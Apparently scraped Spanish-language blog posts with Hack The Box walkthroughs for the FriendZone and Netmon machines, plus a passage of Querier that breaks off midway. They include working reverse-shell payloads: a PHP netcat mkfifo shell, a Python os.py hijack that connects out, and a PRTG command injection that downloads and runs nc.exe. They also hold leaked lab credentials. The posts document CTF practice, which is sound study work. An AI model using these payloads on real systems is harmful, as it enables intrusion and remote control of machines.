\u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puertos con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-10 14:12 PST Nmap scan report for 10.10.10.123 Host is up (0.20s latency). Not shown: 993 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 443/tcp open ssl/http Apache httpd 2.4.29 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 46.20 seconds   FTP Haciendo un login como usuario anonimo no encontramos nada en este puerto.\nENUMERATION HTTP 1 2 3 4  gobuster -u 10.10.10.123 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -np -x php,txt,html -t 15 -q /index.html (Status: 200) /wordpress (Status: 301) /robots.txt (Status: 200)   Ninguno de los directorios y archivos encontrados en el puerto 80 (HTTP) son de ayuda, pero en el index de la pagina aparece un dominio que podriamos utilizar.\nfriendzoneportal.red. Agregamos el dominio al archivo host (/etc/hosts) y encontramos que la pagina tiene contenido en el protocolo https, procedemos a enumerar los directorios y archivos.\nHTTPS 1 2  gobuster -u https://friendzoneportal.red/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -np -k -x php,txt,html -t 35 -q /index.html (Status: 200)   Samba Utilizando la herramienta smbclient para enumerar los sharenames que estan en el servicio de samba.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  smbclient -L 10.10.10.123 Enter WORKGROUP\\root\u0026#39;s password: Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers Files Disk FriendZone Samba Server Files /etc/Files general Disk FriendZone Samba Server Files Development Disk FriendZone Samba Server Files IPC$ IPC IPC Service (FriendZone server (Samba, Ubuntu)) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP FROLIC   En uno de los sharenames podemos ver que Files tiene un comentario que nos dice se encuentra en la carpeta local /etc/files. al logearnos a general encontramos unas credenciales y una frase creds for the admin THING que podria hacer referencia a algun panel de administracion, en este sharename no tenemos permisos suficientes para subir o escribir archivos.\n1 2 3 4 5 6 7  smbclient \\\\\\\\10.10.10.123\\\\general Enter WORKGROUP\\root\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Wed Jan 16 12:10:51 2019 .. D 0 Wed Jan 23 13:51:02 2019 creds.txt N 57 Tue Oct 9 16:52:42 2018   creds.txt\n1 2  creds for the admin THING: admin:WORKWORKHhallelujah@#   Utilizando las credenciales que encontramos anteriormente, en Development no encontramos nada pero si podemos escribir o subir archivos, mas no ejecutarlos.\n1 2 3 4 5 6  smbclient \\\\\\\\10.10.10.123\\\\Development --user=admin WORKWORKHhallelujah@# smb: \\\u0026gt; ls . D 0 Sun Feb 10 19:12:08 2019 .. D 0 Wed Jan 23 13:51:02 2019 php-reverse-shell.php N 5493 Sat Feb 9 18:47:48 2019   SUBDOMINIOS Utilizando la ip y el dominio anteriormente utilizado en https, encontramos varios subdominios:\n1 2 3 4 5 6 7 8 9 10 11  dig axfr friendzoneportal.red @10.10.10.123 friendzoneportal.red.\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800 friendzoneportal.red.\t604800\tIN\tAAAA\t::1 friendzoneportal.red.\t604800\tIN\tNS\tlocalhost. friendzoneportal.red.\t604800\tIN\tA\t127.0.0.1 admin.friendzoneportal.red. 604800 IN\tA\t127.0.0.1 files.friendzoneportal.red. 604800 IN\tA\t127.0.0.1 imports.friendzoneportal.red. 604800 IN\tA\t127.0.0.1 vpn.friendzoneportal.red. 604800 IN\tA\t127.0.0.1 friendzoneportal.red.\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800   Ver Nmap scan \u0026ndash;\u0026gt; friendzone.red (CommonName)\n1 2 3 4 5 6 7 8 9 10  dig friendzone.red axfr @10.10.10.123 friendzone.red.\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800 friendzone.red.\t604800\tIN\tAAAA\t::1 friendzone.red.\t604800\tIN\tNS\tlocalhost. friendzone.red.\t604800\tIN\tA\t127.0.0.1 administrator1.friendzone.red. 604800 IN A\t127.0.0.1 hr.friendzone.red.\t604800\tIN\tA\t127.0.0.1 uploads.friendzone.red.\t604800\tIN\tA\t127.0.0.1 friendzone.red.\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800   Agregamos los subdominios a /etc/hosts.\n1 2 3 4 5 6 7 8  admin.friendzoneportal.red files.friendzoneportal.red imports.friendzoneportal.red vpn.friendzoneportal.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red   ENUMERANDO DIRECTORIOS friendzone.red /js/js/\nuploads.friendzone.red 1 2 3  /files /files/note /upload.php   hr.friendzone.red EMPTY\nadministrator1.friendzone.red 1 2 3  /dashboard.php /login.php /timestamp.php   LFI - Securityartwork\nLFI - xapax\nLFI administrator1.friendzone.red En el primer subdominio econtramos un login y utilizando las credenciales nos muestra un mensaje, donde nos indica que para mostrar la imagen del script debemos de insertar lo siguiente: ?image_id=a.jpg\u0026amp;pagename=timestamp\nAl realizar dicho request a la pagina obtenemos la imagen y lo que parece el tiempo en que se ejecuto el programa.\nSi nos concentramos en la solicitud de la pagina podemos ver que existe un parametro que llama(include $_GET[\u0026lsquo;pagina\u0026rsquo;];) a una pagina pagename=timestamp, anteriormente enumeramos los directorios y archivos de la pagina. Al intentar con el archivo login.php en lugar de timestamp nos muestra el siguiente mensaje.\nPodemos observar que la pagina es vulnerable a ataques de LFI, cuando se hace la solicitud del archivo (timestamp,login) este lo ejecuta y lo muestra por debajo como en la figura anterior. Para poder saltarnos la ejecucion podemos utilizar un filtro de php en este caso php://filter/convert.base64-encode/resource=archivophp y asi obtener el codigo fuente de los archivos locales en base64 para luego decodificarlo.\npagename=php://filter/convert.base64-encode/resource=dashboard\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  \u0026lt;?php //echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;h2\u0026gt;Smart photo script for friendzone corp !\u0026lt;/h2\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; //echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;h3\u0026gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !\u0026lt;/h3\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;title\u0026gt;FriendZone Admin !\u0026lt;/title\u0026gt;\u0026#34;; $auth = $_COOKIE[\u0026#34;FriendZoneAuth\u0026#34;]; if ($auth === \u0026#34;e7749d0f4b4da5d03e6e9196fd1d18f1\u0026#34;){ echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;h2\u0026gt;Smart photo script for friendzone corp !\u0026lt;/h2\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;h3\u0026gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !\u0026lt;/h3\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; if(!isset($_GET[\u0026#34;image_id\u0026#34;])){ echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;p\u0026gt;image_name param is missed !\u0026lt;/p\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;p\u0026gt;please enter it to show the image\u0026lt;/p\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;p\u0026gt;default is image_id=a.jpg\u0026amp;pagename=timestamp\u0026lt;/p\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; }else{ $image = $_GET[\u0026#34;image_id\u0026#34;]; echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;img src=\u0026#39;images/$image\u0026#39;\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;Something went worng ! , the script include wrong param !\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; include($_GET[\u0026#34;pagename\u0026#34;].\u0026#34;.php\u0026#34;); //echo $_GET[\u0026#34;pagename\u0026#34;];  } }else{ echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;p\u0026gt;You can\u0026#39;t see the content ! , please login !\u0026lt;/center\u0026gt;\u0026lt;/p\u0026gt;\u0026#34;; } ?\u0026gt;   pagename=php://filter/convert.base64-encode/resource=timestamp\n1 2 3 4  \u0026lt;?php $time_final = time() + 3600; echo \u0026#34;Final Access timestamp is $time_final\u0026#34;; ?\u0026gt;   pagename=php://filter/convert.base64-encode/resource=../www/admin/login\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  \u0026lt;?php $username = $_POST[\u0026#34;username\u0026#34;]; $password = $_POST[\u0026#34;password\u0026#34;]; //echo $username === \u0026#34;admin\u0026#34;; //echo strcmp($username,\u0026#34;admin\u0026#34;);  if ($username===\u0026#34;admin\u0026#34; and $password===\u0026#34;WORKWORKHhallelujah@#\u0026#34;){ setcookie(\u0026#34;FriendZoneAuth\u0026#34;, \u0026#34;e7749d0f4b4da5d03e6e9196fd1d18f1\u0026#34;, time() + (86400 * 30)); // 86400 = 1 day  echo \u0026#34;Login Done ! visit /dashboard.php\u0026#34;; }else{ echo \u0026#34;Wrong !\u0026#34;; } ?\u0026gt;   OBTENIENDO ACCESO Anteriormente pudimos obtener el codigo fuente de las paginas locales y accesso a dos de los sharenames disponibles en el servicio de samba, pero en uno de ellos nos indica que la carpeta local del sharename Files es en /etc/Files por lo que concluimos que Development y general estan en la carpeta /etc/Development y /etc/general, de los cuales solo tenemos acceso a Development, procedemos a subir un archivo en samba con el sharename Development y hacer una solicitud a la carpeta /etc/Development/NuestroArchivo.\n1  echo \u0026#39;\u0026lt;?php echo \u0026#34;\u0026lt;/center\u0026gt;\u0026lt;h1\u0026gt;Yo soy Batman\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;;?\u0026gt;\u0026#39; \u0026gt; batman.php   Smbclient smbclient \\\\\\\\10.10.10.123\\\\Development --user=admin WORKWORKHhallelujah@# Try \u0026quot;help\u0026quot; to get a list of possible commands. smb: \\\u0026gt; put batman.php putting file batman.php as \\batman.php (0.0 kb/s) (average 0.0 kb/s) Solicitud:\nhttps://administrator1.friendzone.red/dashboard.php?pagename=php://filter/resource=/etc/Development/batman\nComo podemos ver nuestro archivo con un simple texto se ejecuta, de la misma forma podemos ejecutar comandos mediante php y asi obtener una shell inversa.\n1 2  echo \u0026#39;\u0026lt;?php system(\u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.15.78 7878 \u0026gt;/tmp/f\u0026#34;);?\u0026gt;\u0026#39; \u0026gt; batman_sh.php put batman_sh.php   nc -lvp 7878 USER Flag Para el user flag solo falto un poco de enumeracion en los archivos locales y en la configuracion de la base de datos mysql del servidor encontramos un usuario y contraseña de un usuario.\nssh friend@10.10.10.123 Password: Agpyu12!0.213$ ROOT SHELL Utilizando pspy para encontrar tareas que se ejecutan como usuario root logramos ver una que se encuentra dentro de la carpeta /opt, es un script escrito en python llamado reporter.py, el cual tiene permisos root, dentro del script podemos ver que importa la libreria os e imprime algunos mensajes.\nGithub - pspy\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  /opt/server_admin/reporter.py #!/usr/bin/python import os to_address = \u0026#34;admin1@friendzone.com\u0026#34; from_address = \u0026#34;admin2@friendzone.com\u0026#34; print \u0026#34;[+] Trying to send email to %s\u0026#34;%to_address #command = \u0026#39;\u0026#39;\u0026#39; mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass \u0026#34;PAPAP\u0026#34;\u0026#39;\u0026#39;\u0026#39; #os.system(command) # I need to edit the script later # Sam ~ python developer   Utilizando la tecnica de Python Library Hijacking podemos obtener una shell inversa editando la libreria os.py que se encuentra en /usr/lib/python2.7/os.py podemos utilizar el siguiente codigo.\nrastating - Python Library Hijacking\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.15.126\u0026#34;,7878));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]); import os import pty import socket lhost = \u0026#34;10.10.15.126\u0026#34; lport = 7878 ZIP_DEFLATED = 0 class ZipFile: def close(*args): return def write(*args): return def __init__(self, *args): return s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) os.putenv(\u0026#34;HISTFILE\u0026#34;,\u0026#39;/dev/null\u0026#39;) pty.spawn(\u0026#34;/bin/bash\u0026#34;) s.close()   Como podemos ver en el script se ejecuta cada medio minuto por lo cual obtendremos una shell inversa como usuario root.\n","description":"FriendZone es una maquina CTF Like donde encontramos una vulnerabilidad LFI en uno de los subdominios donde obtuvimos acceso en conjunto con un recurso de SAMBA. Encontramos en un archivo de configuracion una contraseña para el siguiente usuario para finalmente realizar Python Library Hijacking para escalar privilegios.","id":145,"section":"posts","tags":["smbclient","dig","lfi","cron","python library hijacking"],"title":"Hack The Box - FriendZone","uri":"https://sckull.github.io/posts/friendzone/"},{"content":"  Nos topamos con el puerto FTP con autenticacion minima, pudimos acceder a la archivos de configuracion de PRTG Network Monitor donde encontramos credenciales en archivo de configuracion. El software de monitoreo tiene una vulnerabilidad de Command Injection el cual aprovechamos para ejecutar una shell inversa y obtener privilegios de administrador.\nInformacion de la Maquina    Nombre Netmon      OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.152   Maker mrb3n    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[5.3, 6.4, 6.7, 3.3, 3.6], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[3, 9, 10, 0, 1], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Al realizar un escaneo con nmap nos muestra servicios ftp, http y puertos de windows.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60  root@sckull:~# nmap -sT -p- --min-rate 5000 10.10.10.152 -o tcp Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-06 18:59 GMT Warning: 10.10.10.152 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.152 Host is up (0.24s latency). Not shown: 32841 closed ports, 32683 filtered ports PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49673/tcp open unknown 50315/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 169.37 seconds root@sckull:~# nmap -sC -p 21,80,135,139,445 -o nmap-ports.scan 10.10.10.152 Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-06 19:03 GMT Nmap scan report for 10.10.10.152 Host is up (0.16s latency). PORT STATE SERVICE 21/tcp open ftp | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 02-02-19 11:18PM 1024 .rnd | 02-25-19 09:15PM \u0026lt;DIR\u0026gt; inetpub | 07-16-16 08:18AM \u0026lt;DIR\u0026gt; PerfLogs | 02-25-19 09:56PM \u0026lt;DIR\u0026gt; Program Files | 02-02-19 11:28PM \u0026lt;DIR\u0026gt; Program Files (x86) | 02-03-19 07:08AM \u0026lt;DIR\u0026gt; Users |_02-25-19 10:49PM \u0026lt;DIR\u0026gt; Windows | ftp-syst: |_ SYST: Windows_NT 80/tcp open http | http-title: Welcome | PRTG Network Monitor (NETMON) |_Requested resource was /index.htm 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds Host script results: |_clock-skew: mean: 48s, deviation: 0s, median: 47s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-03-06 19:03:57 |_ start_date: 2019-03-06 18:58:01 Nmap done: 1 IP address (1 host up) scanned in 10.87 seconds   FTP - Puerto 21 Con las credenciales anonymous:anonymous obtenemos acceso y tambien la bandera user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60  root@sckull:~# ftp 10.10.10.152 Connected to 10.10.10.152. 220 Microsoft FTP Service Name (10.10.10.152:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp\u0026gt; ls -lah 200 PORT command successful. 125 Data connection already open; Transfer starting. 11-20-16 09:46PM \u0026lt;DIR\u0026gt; $RECYCLE.BIN 02-02-19 11:18PM 1024 .rnd 11-20-16 08:59PM 389408 bootmgr 07-16-16 08:10AM 1 BOOTNXT 02-03-19 07:05AM \u0026lt;DIR\u0026gt; Documents and Settings 02-25-19 09:15PM \u0026lt;DIR\u0026gt; inetpub 03-06-19 02:04PM 738197504 pagefile.sys 07-16-16 08:18AM \u0026lt;DIR\u0026gt; PerfLogs 02-25-19 09:56PM \u0026lt;DIR\u0026gt; Program Files 02-02-19 11:28PM \u0026lt;DIR\u0026gt; Program Files (x86) 02-25-19 09:56PM \u0026lt;DIR\u0026gt; ProgramData 02-03-19 07:05AM \u0026lt;DIR\u0026gt; Recovery 02-03-19 07:04AM \u0026lt;DIR\u0026gt; System Volume Information 02-03-19 07:08AM \u0026lt;DIR\u0026gt; Users 02-25-19 10:49PM \u0026lt;DIR\u0026gt; Windows 226 Transfer complete. ftp\u0026gt; cd Users 250 CWD command successful. ftp\u0026gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-25-19 10:44PM \u0026lt;DIR\u0026gt; Administrator 02-02-19 11:35PM \u0026lt;DIR\u0026gt; Public 226 Transfer complete. ftp\u0026gt; cd Public 250 CWD command successful. ftp\u0026gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 07:05AM \u0026lt;DIR\u0026gt; Documents 07-16-16 08:18AM \u0026lt;DIR\u0026gt; Downloads 07-16-16 08:18AM \u0026lt;DIR\u0026gt; Music 07-16-16 08:18AM \u0026lt;DIR\u0026gt; Pictures 02-02-19 11:35PM 33 user.txt 07-16-16 08:18AM \u0026lt;DIR\u0026gt; Videos 226 Transfer complete. ftp\u0026gt; bin 200 Type set to I. ftp\u0026gt; get user.txt local: user.txt remote: user.txt 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 33 bytes received in 0.37 secs (0.0877 kB/s) ftp\u0026gt; root@sckull:~# cat user.txt dd58ce67b49e15105e88096c8d9255a5   ENUMERACION FTP Al realizar una enumeracion a los directorios por medio de ftp encontramos un programa llamado PRTG Network Monitor el cual funciona para monitoreo de red, el uso de ancho de banda o tiempo de actividad.\nHTTP - puerto 80 PRTG Realizando una busqueda por google nos encontramos con exploits para este monitor de red, pero para ello debemos de logearnos al portal web, el usuario y contraseña por default (prtgadmin:prtgadmin) no funcionan, por lo que yendo ún poco mas profundo encontramos un pequeño post en reddit que hablan acerca de un archivo \u0026lsquo;PRTG Configuration.dat\u0026rsquo; que puede contener contraseñas que no estan encriptadas de igual forma en archivo \u0026lsquo;PRTG Configuration.old\u0026rsquo;.\nreddit/prtg_gave_away_some_of_your_passwords\nSabiendo esto buscamos dentro de la maquina los archivos, por lo general se encuentran en el misma direccion que el programa (../Program Files/PRTG Network Monitor/PRTG configuration.dat) pero, al parecer el administrador cambio la direccion. Para enumerar archivos de manera rapida utilizamos Filezilla.\nLos archivos los pudimos encontrar en /Users/All Users/Paessler/PRTG Network Monitor.\nHicimos una busqueda de contraseñas dentro de los archivos y en PRTG Configuration.old.bak encontramos una contraseña para el usuario prtgadmin.\n1 2 3 4  \u0026lt;dbpassword\u0026gt; \u0026lt;!-- User: prtgadmin --\u0026gt; PrTg@dmin2018 \u0026lt;/dbpassword\u0026gt;   Al intentar logearnos con las credenciales (prtgadmin:PrTg@dmin2018) el portal no nos deja, por lo que podemos ver el archivo en donde se encuentra la contraseña es un archivo backup y fue creado en el año de 2018, que tal si le cambiamos el año a la contraseña (PrTg@admin2018) al actual \u0026ndash;\u0026gt; PrTg@dmin2018\nPRTG Command Injection Tenemos una sesion abierta dentro del portal, ahora que estamos dentro podemos hacer inyeccion de comandos.\nPRTG \u0026lt; 18.2.39 Command Injection Vulnerability\nNos dirigimos a Setup \u0026gt; Account Settings \u0026gt; Notifications\nCreamos una nueva notificacion y marcamos la opcion de EXECUTE PROGRAM, dentro de los parametros escribimos lo siguiente:\n1  C:\\netcat.txt;powershell -c \u0026#34;wget http://10.10.12.122/nc.exe -OutFile C:\\nc.exe; C:\\nc.exe 10.10.12.122 7878 -e cmd\u0026#34;   ADMINISTRATOR - USER Antes de ejecutar el comando debemos de poner a la escucha nuestra maquina para poder descargar nc.exe (netcat), luego de esto ejecutamos nuestra notificacion (test). Para ejecutarlo debemos de ir a donde esta la lista de notificaciones selecionamos la nuestra y en la parte derecha presionamos la campanita para hacer un test.\nObservamos por medio del servicio ftp que el archivo nc.exe se creó exitosamente en C:/nc.exe.\nY obtenemos una shell como administrador.\nY nuestra bandera de root.txt.\n","description":"Nos topamos con el puerto FTP con autenticacion minima, pudimos acceder a la archivos de configuracion de PRTG Network Monitor donde encontramos credenciales en archivo de configuracion. El software de monitoreo tiene una vulnerabilidad de Command Injection el cual aprovechamos para ejecutar una shell inversa y obtener privilegios de administrador.","id":146,"section":"posts","tags":["ftp","PRTG"],"title":"Hack The Box - Netmon","uri":"https://sckull.github.io/posts/netmon/"},{"content":"  Querier es una maquina de HackTheBox, descubrirmos credenciales en una coneccion de base de datos SQL Server dentro de los macros de Excel (xlsm) lo que nos dio acceso a la base de datos mediante un script de Impacket y que posteriormente nos permitio realizar Out-of-Band para obtener las credenciales, este ultimo nos permitio ejecutar una shell inversa. Tras ejecutar PowerUp encontramos credenciales las cuales utilizamos en PSexec para obtener privilegios de administrador.\nInformacion de la Maquina    Nombre Querier      OS Windows   Puntos 30   Dificultad Media   IP 10.10.10.125   Maker mrh4shegre55    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[7.7, 8.1, 5.7, 4.3, 1.9], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[0, 0, 0, 0, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN Utilizando la herramienta masscan para hacer un escaneo rapido de todos los puertos en tcp y udp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  masscan -p1-65535,U:1-65535 10.10.10.125 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-02-19 05:54:40 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 49665/tcp on 10.10.10.125 Discovered open port 49666/tcp on 10.10.10.125 Discovered open port 49670/tcp on 10.10.10.125 Discovered open port 47001/tcp on 10.10.10.125 Discovered open port 135/tcp on 10.10.10.125 Discovered open port 49664/tcp on 10.10.10.125 Discovered open port 5985/tcp on 10.10.10.125 Discovered open port 49668/tcp on 10.10.10.125 Discovered open port 49671/tcp on 10.10.10.125 Discovered open port 139/tcp on 10.10.10.125   HTTP Al realizar una busqueda de archivos y directorios en el puerto 5985 no encontramos nada.\nSMBCLIENT Enumerando SHARENAMES con smbclient encontramos Reports e intentamos conectarnos.\n1 2 3 4 5 6 7 8 9  smbclient -L 10.10.10.125 Enter WORKGROUP\\root\u0026#39;s password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC Reports Disk   Dentro de Reports econtramos un archivo xlsm el cual no contiene nada\n1 2 3  smbclient \\\\\\\\10.10.10.125\\\\Reports \u0026#39;Currency Volume Report.xlsm\u0026#39;   Binwalk Al utilizar BinWalk para analizar el archivo en busqueda de archivos ocultos encontramos dentro del archivo un macro con el siguiente codigo:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  Rem Attribute VBA_ModuleType=VBADocumentModule Option VBASupport 1 \u0026#39; macro to pull data for client volume reports \u0026#39; \u0026#39; further testing required  Private Sub Connect() Dim conn As ADODB.Connection Dim rs As ADODB.Recordset Set conn = New ADODB.Connection conn.ConnectionString = \u0026#34;Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6\u0026#34; conn.ConnectionTimeout = 10 conn.Open If conn.State = adStateOpen Then \u0026#39; MsgBox \u0026#34;connection successful\u0026#34;  \u0026#39;Set rs = conn.Execute(\u0026#34;SELECT * @@version;\u0026#34;)  Set rs = conn.Execute(\u0026#34;SELECT * FROM volume;\u0026#34;) Sheets(1).Range(\u0026#34;A1\u0026#34;).CopyFromRecordset rs rs.Close End If End Sub   MICROSOFT SQL SERVER Ya que tenemos credenciales para la base de datos procedemos a utilizar mssqlclient.py el cual es un script que funciona para conectarnos a una base de datos utilizando autenticacion de windows. Ya dentro encontramos bases de datos que son por \u0026ldquo;default\u0026rdquo; en Microsoft SQL Server.\nSQL Server 